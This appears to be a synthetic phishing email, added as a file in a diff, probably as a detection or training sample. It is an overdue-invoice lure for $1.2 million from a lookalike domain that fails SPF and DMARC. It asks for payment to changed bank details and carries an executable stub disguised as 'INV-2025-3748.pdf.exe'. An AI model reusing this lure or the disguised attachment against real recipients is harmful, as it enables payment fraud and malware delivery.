@@ -1,0 +1,76 @@
+From: "Kestrel Supplies Ltd Accounts" <billing@linkedin-invitation.click>
+To: Anna Ellis <anna.ellis@brightpath-edu.ac.in>
+Subject: Purchase order INV-2025-3748 needs your approval
+Date: Tue, 12 May 2026 05:30:00 +0000
+Message-ID: <178772093968.6.17701697320129239431@linkedin-invitation.click>
+Return-Path: <bounce-2659@linkedin-invitation.click>
+MIME-Version: 1.0
+Received: from mx1.mail-relay.example (mx1.mail-relay.example [192.0.2.10]) by
+ mx.brightpath-edu.ac.in (Postfix) with ESMTPS id 7AC35F3F442C for
+ <recipient@brightpath-edu.ac.in>; Tue, 12 May 2026 05:30:00 +0000
+Received: from vps-31.hosting.example (vps-31.hosting.example [198.51.100.7])
+ by mx1.mail-relay.example (Postfix) with ESMTPS id B2C88154FC70; Tue, 12 May
+ 2026 05:24:30 +0000
+Received: from smtp-out-3.example (smtp-out-3.example [192.0.2.44]) by
+ vps-31.hosting.example (Postfix) with ESMTPS id 4D319746993A; Tue, 12 May
+ 2026 05:20:45 +0000
+Received: from edge-2.mailcluster.example (edge-2.mailcluster.example
+ [203.0.113.61]) by smtp-out-3.example (Postfix) with ESMTPS id B8C640E5F6D4;
+ Tue, 12 May 2026 05:19:38 +0000
+Received: from mail.gateway.example (mail.gateway.example [203.0.113.5]) by
+ edge-2.mailcluster.example (Postfix) with ESMTPS id B24D634B4723; Tue, 12 May
+ 2026 05:17:46 +0000
+Received-SPF: fail (mailfrom) identity=mailfrom; client-ip=198.51.100.150;
+ envelope-from=<bounce@linkedin-invitation.click>;
+Authentication-Results: mx.linkedin-invitation.click; spf=fail
+ smtp.mailfrom=linkedin-invitation.click; dkim=none
+ header.d=linkedin-invitation.click; dmarc=fail (p=reject)
+ header.from=linkedin-invitation.click
+Content-Type: multipart/mixed; boundary="===============3242505347515365091=="
+
+--===============3242505347515365091==
+Content-Type: multipart/alternative;
+ boundary="===============2498189581087430603=="
+
+--===============2498189581087430603==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Hello Anna,
+
+Please find attached invoice INV-2025-3748 for $1,201,000, now overdue. Kindly
+review the attached statement and process this payment immediately to avoid
+service interruption.
+
+If the bank details have changed since your last remittance, use the updated
+account information in the attachment.
+
+Regards,
+Aditya Iyer
+Accounts Receivable, Kestrel Supplies Ltd
+
+--===============2498189581087430603==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Segoe UI,Arial,sans-serif;font-size:14px;col=
+or:#202124"><p>Hello Anna,</p><p>Please find attached invoice INV-2025-3748 f=
+or $1,201,000, now overdue. Kindly review the attached statement and process =
+this payment immediately to avoid service interruption.</p><p>If the bank det=
+ails have changed since your last remittance, use the updated account informa=
+tion in the attachment.</p><p>Regards, Aditya Iyer Accounts Receivable, Kestr=
+el Supplies Ltd</p></body></html>
+
+--===============2498189581087430603==--
+
+--===============3242505347515365091==
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="INV-2025-3748.pdf.exe"
+MIME-Version: 1.0
+
+TVqQAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRo
+aXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl
+
+--===============3242505347515365091==--
